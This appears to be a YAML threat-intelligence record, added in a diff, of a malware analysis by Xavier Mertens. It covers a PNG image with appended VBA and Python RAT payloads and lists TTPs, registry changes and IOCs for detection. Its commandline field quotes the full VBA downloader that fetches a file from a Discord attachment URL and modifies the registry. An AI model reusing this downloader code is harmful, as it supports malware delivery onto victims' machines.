@@ -1,0 +1,44 @@
+description: A PNG image is concatenated with VBA and Python payloads, demonstrating
+  a proof-of-concept for delivering malicious code. The VBA code updates the desktop
+  wallpaper and downloads another payload from a Discord URL, while the embedded Python
+  RAT includes keylogging, task manager blocking, input disabling, and mouse/keyboard
+  manipulation capabilities.
+attribution: Xavier Mertens (@xme)
+malware_families:
+- RAT (Python)
+- VBA Macro
+TTPs:
+- processes:
+  - WScript.Shell
+  - RUNDLL32.EXE
+  - user32.dll
+- commandline:
+  - C:\\Windows\\System32\\wscript.exe "haly.png"
+  - 'Set objShell = CreateObject("WScript.Shell") Set objEnv = objShell.Environment("User") strDirectory = objShell.ExpandEnvironmentStrings("%temp%") dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") dim bStrm: Set bStrm = createobject("Adodb.Stream") xHttp.Open "GET", "hxxps://media[.]discordapp[.]net/attachments/773993506615722064/798005313278050354/haly.png", False xHttp.Send with bStrm .type = 1 ''//binary .open .write xHttp.responseBody .savetofile strDirectory + "\haly.png", 2 ''//overwrite end with objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", strDirectory + "\haly.png" objShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True'
+- powershell: []
+- scripting_engine:
+  - VBA
+  - Python
+- registry_keys:
+  - HKCU\\Control Panel\\Desktop\\Wallpaper
+- image_load: []
+- network_connections:
+  - executable: wscript.exe
+    destination_address: media[.]discordapp[.]net
+    port: ''
+    url: hxxps://media[.]discordapp[.]net/attachments/773993506615722064/798005313278050354/haly.png
+- file_activity:
+  - C:\\Users\\%username%\\AppData\\Local\\Temp\\haly.png
+  - keylogs.txt
+- persistence:
+  - Registry Key Modification (HKCU\\Control Panel\\Desktop\\Wallpaper)
+- pipes: []
+- process_relations: []
+IOCs:
+- hash: f014123c33b362df3549010ac8b37d7b28e002fc9264c54509ac8834b66e15ad
+- url: hxxps://media[.]discordapp[.]net/attachments/773993506615722064/798005313278050354/haly.png
+authors:
+- Xavier Mertens (@xme)
+reference: https://isc.sans.edu/diary/A+PNG+Image+With+an+Embedded+Gift/31998/
+date_of_publication: May 31, 2025
+file_creation_date: June 08, 2025
